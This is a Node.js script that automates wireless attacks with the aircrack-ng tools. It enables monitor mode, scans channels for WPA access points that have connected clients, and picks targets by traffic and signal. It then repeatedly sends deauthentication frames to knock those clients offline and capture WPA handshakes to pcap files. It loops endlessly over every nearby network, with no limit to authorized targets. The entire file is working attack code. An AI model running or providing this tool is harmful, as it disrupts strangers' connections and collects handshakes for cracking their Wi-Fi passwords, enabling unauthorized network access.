const { spawn } = require('child_process');
const fs = require('fs');
const {glob} = require("glob");

// wlan monitor interface name
const iface = 'wlan0mon';

let Conf = {

    data: {
        'is-loaded': false, // flag is synced with conf.json file
        'airodump-scan-time': 120, // sec
        'airodump-capture-timeout': 180, // sec
        'bssid-wait-list': [], // [{'bssid': 'xx:xx:..', 'addedTime': time}, {..}]
        'bssid-except-list': [], // ['xx:xx..', 'yy:yy:..']  - found points or just except this points
        'bssid-wait-time': 30  // min
    },

    filePath: 'conf.json',

    load: async () => {
        try {
            let data = await Storage.read(Conf.filePath);

            if (!data) {
                await Conf.write(Conf.data);
                data = await Storage.read(Conf.filePath);
            }

            data = JSON.parse(data);

            if (typeof data['is-loaded'] !== 'undefined') {
                Conf.data = data;
                Conf.data['is-loaded'] = true;
            } else {
                await Conf.write(Conf.data);
                Conf.data['is-loaded'] = true;
            }

        } catch(e) {
            await Conf.write(Conf.data);
            Conf.data['is-loaded'] = true;
        }
        return Conf.data;
    },

    write: async (data) => {
        await Storage.write(Conf.filePath, data);
    },

    isInExceptionList: (point) => {
        for (let bssid of Conf.data['bssid-except-list']) {
            if (bssid === point['bssid']) {
                return true;
            }
        }
        return false;
    },

    rebuildWaitList: async () => {

        // recalculate bssid-wait-list
        let timestamp = Math.floor(new Date().getTime() / 1000);
        let waitList = [];
        for (let i in Conf.data['bssid-wait-list']) {
            if (Conf.data['bssid-wait-list'].hasOwnProperty(i)) {
                let waitBssid = Conf.data['bssid-wait-list'][i];
                if ( (timestamp - waitBssid['addedTime'])/60 < Conf.data['bssid-wait-time']) {
                    waitList.push(waitBssid);
                }
            }
        }
        Conf.data['bssid-wait-list'] = waitList;
    },

    addWaitBssid: async (bssid) => {

        let timestamp = Math.floor(new Date().getTime() / 1000);

        let exist = false;
        for (let i in Conf.data['bssid-wait-list']) {
            if (Conf.data['bssid-wait-list'].hasOwnProperty(i)) {
                let waitBssid = Conf.data['bssid-wait-list'][i];
                if (waitBssid['bssid'] === bssid) {
                    exist = true;
                    Conf.data['bssid-wait-list'][i]['addedTime'] = timestamp;
                }
            }
        }

        if (!exist) {
            Conf.data['bssid-wait-list'].push({
                'bssid': bssid,
                'addedTime': timestamp
            });
        }
    },

    isWaitBssid: (bssid) => {
        let exist = false;
        let timestamp = Math.floor(new Date().getTime() / 1000);

        for (let i in Conf.data['bssid-wait-list']) {
            if (Conf.data['bssid-wait-list'].hasOwnProperty(i)) {
                let waitBssid = Conf.data['bssid-wait-list'][i];
                if (waitBssid['bssid'] === bssid
                    && (timestamp - waitBssid['addedTime'])/60 < Conf.data['bssid-wait-time']
                ) {
                    exist = true;
                }
            }
        }
        return exist;
    }
};

let Storage = {

    read: async (file) => {
        return new Promise((res, rej) => {
            try {
                fs.readFile(file, "utf8", (err, data) => { res(data); });
            } catch(e) {}
        });
    },

    write: async (file, data) => {
        return new Promise((res, rej) => {
            fs.writeFile(file, JSON.stringify(data), "utf8", (inf) => {
                res();
            });
        });
    },

    log: async (file, line) => {
        return new Promise((res, rej) => {
            fs.appendFile('./logs/'+ file, line+"\n", err => {
                if (err) { rej() }
                res();
            });
        });
    }
};

/**
 * check and init monitor mode
 * @constructor
 */
let InitMonitorMode = async function(){

    // check if monitor mode is enabled
    let isMonitorModeEnabled = async function(){

        return new Promise(function(res, rej){

            let ifconfig = spawn('ifconfig', [iface]);

            let parseResult = function(data){
                data = data.toString();
                let notFound1 = data.indexOf('Device not found');
                let notFound2 = data.indexOf('does not exist');

                if (notFound1 >= 0 || notFound2 >= 0) {
                    return false;
                } else {
                    return true;
                }
            };

            ifconfig.stdout.on('data', data => { res(parseResult(data)); });
            ifconfig.stderr.on('data', data => { res(parseResult(data)); });
        });
    };

    // enable monitor mode
    let enableMonitorMode = async function(){
        return new Promise(function(res, rej){
            let airmonStart = spawn('airmon-ng', ['start', 'wlan0']);
            airmonStart.on('close', code => {
                res(code);
            });
            airmonStart.on('error', err => {
                rej(err);
            });
        });
    };

    // check kill
    let checkKill = async function(){
        return new Promise(function(res, rej){
            let airmonKill = spawn('airmon-ng', ['check', 'kill']);
            airmonKill.on('close', code => { res(true); });
        });
    };

    // check & enable monitor mode
    let start = async () => {
        let _isMonitorModeEnabled = await isMonitorModeEnabled();

        if (!_isMonitorModeEnabled) {

            // enable monitor mode
            await enableMonitorMode();

            _isMonitorModeEnabled = await isMonitorModeEnabled();

            if (_isMonitorModeEnabled) {
                await checkKill();
                return true;
            } else {
                return false;
            }
        } else {
            await checkKill();
            return true;
        }
    };

    return {
        'start': start,
        'checkKill': checkKill
    };
};

let AirodumpNg = async () => {

    let getNextTargets = async (startChannel = 1) => {

        let list = [];
        let point = null;

        // scan channels
        for (let ch = 1; ch <= 11; ch++) {
            if (ch < startChannel) { continue; }

            console.log('scan channel - '+ ch);

            list = await scan(ch);
            if (list.length > 0) { break; }
        }

        if (list.length > 0) {
            list = list.sort(function(a, b){ return (a['data'] + a['pwr']) < (b['data'] + b['pwr']); });
            point = list[0];
        }

        return point;
    };

    // capture handshake
    let catchHandshake = async (point) => {
        // __dirname
        let resFilePath = './logs/handshake-'+ point.essid;

        let airodump = spawn('airodump-ng', ['-c', point.ch, '--bssid', point.bssid, '-w', resFilePath, '--output-format', 'pcap', iface]);

        let canDeauth = false;

        let deauth = async () => {
            if (!canDeauth) { return; }
            canDeauth = false;

            for (let client of point.clients) {
                console.log('deauth', '-0', '5', '-a', point.bssid, '-c', client.cmac, iface);

                let aireplay = spawn('aireplay-ng', ['-0', '5', '-a', point.bssid, '-c', client.cmac, iface]);
                await sleep(5);
                aireplay.stdin.end();
                aireplay.kill();
                await sleep(3);
            }

            canDeauth = true;
        };

        let deauthInterval = setInterval(async () => { await deauth(); }, 20 * 1000);

        // is handshake captured
        let isCaptured = (output) => {
            let lines = output.split("\n");

            let captured = false;
            for (let line of lines) {
                if (line.indexOf('handshake') > 0) {
                    captured = true;
                }
            }
            return captured;
        };

        return new Promise((res, rej) => {

            // flag - is handhake captured for this point
            let _isCaptured = false;

            let scanTimeout;

            let end = (status) => {
                clearInterval(deauthInterval);
                clearTimeout(scanTimeout);

                airodump.stdin.end();
                airodump.kill();
                res(status);
            };

            let onOutput = (data) => {
                if (_isCaptured) { return; }

                if (data.trim() !== '') {
                    canDeauth = true;
                }

                if (isCaptured(data)) {
                    _isCaptured = true;
                    console.log('CAPTURED '+ point.essid);

                    Conf.data['bssid-except-list'].push(point.bssid);
                    end(true);
                }
            };

            airodump.on('error', err => {
                console.log('ERROR', err);
                Storage.log('error-', err);
            });

            airodump.stderr.on('data', async data => { onOutput(data.toString()); });
            airodump.stdout.on('data', async data => { onOutput(data.toString()); });

            scanTimeout = setTimeout(async () => {

                if (_isCaptured) { return; }

                // add to wait list
                await Conf.addWaitBssid(point.bssid);

                // remove .pcap files for this point without handshakes
                glob.glob(resFilePath +'*', (err, files) => {
                    for (let file of files) {
                        console.log('remove file -> ', file);
                        fs.unlink(file, err => { });
                    }
                });

                end(false);
            }, Conf.data['airodump-capture-timeout'] * 1000);
        });
    };

    let scan = async (channel) => {

        // airmon-ng check kill
        let MonitorMode = await InitMonitorMode();
        await MonitorMode.checkKill();
        await sleep(1);

        let airodump = spawn('airodump-ng', [iface, '-c', channel]);

        let list = [];
        let clients = [];

        let _processOutput = async (data) => {
            data = data.toString();


            // parse point line
            let _parseLine = async (line) => {

                let _parts = line.split('  ');

                // delete empty parts
                let parts = [];
                for (let j in _parts) {
                    if (_parts.hasOwnProperty(j) && _parts[j].trim() !== '') {
                        parts.push(_parts[j].trim());
                    }
                }

                let point = null;
                if (parts.length === 11
                    && parts[0].indexOf(':') === 2
                    && parts[10] !== 'PSK'
                ) {
                    point = {
                        'bssid': parts[0],
                        'essid': parts[10],
                        'pwr': parts[1],
                        'ch': parts[6],
                        'data': parts[4],
                        'clients': []
                    };

                } else if (
                    parts.length === 10
                    && parts[0].indexOf(':') === 2
                    && parts[7].indexOf('WPA') > 0
                ) {

                    point = {
                        'bssid': parts[0],
                        'essid': parts[9],
                        'pwr': parts[1],
                        'ch': parts[6],
                        'data': parts[4],
                        'clients': []
                    };

                // collect clients
                } else if (
                    (parts.length === 6 || parts.length === 7)
                    && parts[0].indexOf(':') === 2
                ) {
                    clients.push({
                        'bssid': parts[0],
                        'cmac': parts[1], // client mac addr
                        'pwr': parts[2],
                        'lost': parts[4],
                        'frames': parts[5]
                    });
                }

                return point;
            };

            // is point exists in list
            let _isExist = (point) => {
                for (let _point of list) {
                    if (point['bssid'] === _point['bssid']) {
                        return true;
                    }
                }
                return false;
            };

            // collect points
            let lines = data.split("\n");
            for (let line of lines) {
                line = line.trim();

                if (line === '') { continue; }

                let point = await _parseLine(line);

                // add/update point in list
                if (point && point['data'] > 0
                    && !Conf.isInExceptionList(point)
                ) {
                    if (!_isExist(point)) {

                        // add new
                        list.push(point);
                    } else {

                        // update 'data'
                        for (let i in list) {
                            if (list.hasOwnProperty(i)
                                && list[i]['bssid'] === point['bssid']
                                //&& point['data'] > list[i]['data']
                            ) {
                                list[i]['data'] = point['data'];
                            }
                        }
                    }
                }
            }
        };

        // attach clients to associated point
        let attachClients = (clients) => {
            for (let i in list) {
                for (let client of clients) {
                    if (list[i]['bssid'] === client['bssid']) {

                        // already exists ?
                        let _cIndex = false;
                        for (let j in list[i]['clients']) {
                            if (!list[i]['clients'].hasOwnProperty(j)) { continue; }

                            let _client = list[i]['clients'][j];
                            if (_client['bssid'] === client['bssid']) {
                                _cIndex = j;
                                break;
                            }
                        }

                        if (_cIndex !== false) {
                            // update
                            list[i]['clients'][_cIndex]['frames'] = client['frames'];

                        } else {
                            // add new
                            list[i]['clients'].push(client);
                        }
                    }
                }
            }
        };

        // remove points with empty clients list
        // skip points with incorrect channel
        let filterList = (list) => {
            let _list = [];
            for (let i in list) {
                if (!list.hasOwnProperty(i)) { continue; }
                let point = list[i];

                if (point.clients.length > 0
                    && point.ch == channel
                    && !point.essid.match(/[^A-Za-z0-9_\-.]+/)
                    && !Conf.isWaitBssid(point.bssid)
                ) {
                    _list.push(point);
                }
            }
            return _list;
        };

        return new Promise((res, rej) => {

            airodump.stdout.on('data', async data => { await _processOutput(data); });
            airodump.stderr.on('data', async data => { await _processOutput(data); });

            airodump.on('error', err => {
                console.log('ERROR', err);
                Storage.log('err-airodump-scan', err);
            });

            // airodump.on('close', code => {
            //     airodump.stdin.end();
            //     res(code);
            // });

            setTimeout(() => {
                // kill airodump process
                airodump.stdin.end();
                airodump.kill();

                // attach clients to associated point
                attachClients(clients);

                // remove points with empty clients list
                list = filterList(list);

                console.log('points list len: '+ list.length);

                res(list);
            }, Conf.data['airodump-scan-time'] * 1000);
        });
    };

    return {
        'getNextTargets': getNextTargets,
        'catchHandshake': catchHandshake
    };
};

// sleep
let sleep = async (seconds) => { return new Promise((res, rej) => { setTimeout(function(){ res(); }, seconds * 1000); }); };

// run
(async function(){

    // load config
    await Conf.load();

    console.log(Conf.data);

    let MonitorMode = await InitMonitorMode();
    let isEnabled = await MonitorMode.start();

    if (!isEnabled) {
        throw new Error('Can\'t enable monitor mode');
    }

    let lastChannel = 1;
    while (true) {

        let airodump = await AirodumpNg();
        let point = await airodump.getNextTargets(lastChannel);


        if (point) {
            console.log('target point -> '+ point.essid);

            await airodump.catchHandshake(point);
            await Conf.rebuildWaitList();

            lastChannel = point.ch;
        } else {
            Conf.data['bssid-wait-list'] = [];

            // reset channel to scan
            if (lastChannel >= 11) { lastChannel = 1; }
        }

        // flush config
        Conf.write(Conf.data);
    }
})();